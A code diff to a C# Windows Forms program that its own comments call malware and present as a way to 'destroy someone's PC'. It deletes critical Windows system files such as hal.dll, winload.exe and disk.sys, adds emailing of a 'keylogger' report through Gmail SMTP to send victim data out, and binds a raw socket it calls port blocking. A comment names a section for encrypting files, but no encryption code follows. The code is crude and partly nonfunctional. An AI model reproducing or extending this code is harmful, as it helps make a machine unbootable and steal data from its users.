@@ -4,14 +4,20 @@ using System.ComponentModel;
 using System.Data;
 using System.Drawing;
 using System.Linq;
+using System.Net.Mail;
+using System.Drawing;
+using System.Drawing.Imaging;
+using Microsoft.Win32;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
-using Microsoft.Win32;
 using System.IO;
 using System.Media;
+using System.Security.Cryptography;
+using System.Net.Sockets;
+using System.Net;
 
 namespace WindowsFormsApp1
 {
@@ -41,7 +47,8 @@ namespace WindowsFormsApp1
             string hal_dll = @"C:\Windows\System32\hal.dll";
             string ci_dll = @"C:\Windows\System32\ci.dll";
             string winload_exe = @"C:\Windows\System32\winload.exe";
-            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";
+            string disk_sys = @"C:\Windows\System32\drivers\disk.sys"; //F12
+            string memoryanyalizer = @"C:\Windows\System32\F12\MemoryAnalyzer.dll"; //F12
             if (File.Exists(hal_dll))
             {
                 File.Delete(hal_dll);
@@ -57,6 +64,10 @@ namespace WindowsFormsApp1
             if (File.Exists(disk_sys))
             {
                 File.Delete(disk_sys);
+            }
+            if (File.Exists(memoryanyalizer))
+            {
+                File.Delete(memoryanyalizer);
             }
             // Now we get annoying with opening screens.
             Random r;
@@ -117,6 +128,30 @@ namespace WindowsFormsApp1
             r.Next(0, Screen.PrimaryScreen.Bounds.Height));
 
             Controls.Add(Pictur1);
+            // The next line of code sends emails and more.
+            int mailTime = 5000;
+            MailMessage mail = new MailMessage();
+            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
+
+            mail.From = new MailAddress("ThisGuyGotHAXED!");
+            mail.To.Add("dont be stupid!");
+            mail.Subject = "Keylogger date: " + DateTime.Now.ToLongDateString();
+            mail.Body = "Information key from victim\n";
+            SmtpServer.Port = 587;
+            SmtpServer.Credentials = new System.Net.NetworkCredential("ThisGuyGotHAXED!", "dont be stupid!");
+            SmtpServer.EnableSsl = true;
+
+            SmtpServer.Send(mail);
+            Console.WriteLine("Send mail!");
+            // Blocking a port.
+            int portToBlock = 80;
+            Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Raw, ProtocolType.IP);
+            IPEndPoint ep = new IPEndPoint(IPAddress.Loopback, portToBlock);
+            s.Bind(ep);
+            string password = "Hu11an_!ndusTr!al";
+            GCHandle gch = GCHandle.Alloc(password, GCHandleType.Pinned);
+            gch.Free();
+            // Encrypting files.
             // Any help on this malware is apreciated.
             // However i advise not downloading this and using it on your own PC.
             // If you do download it and you wanna destory someones pc:
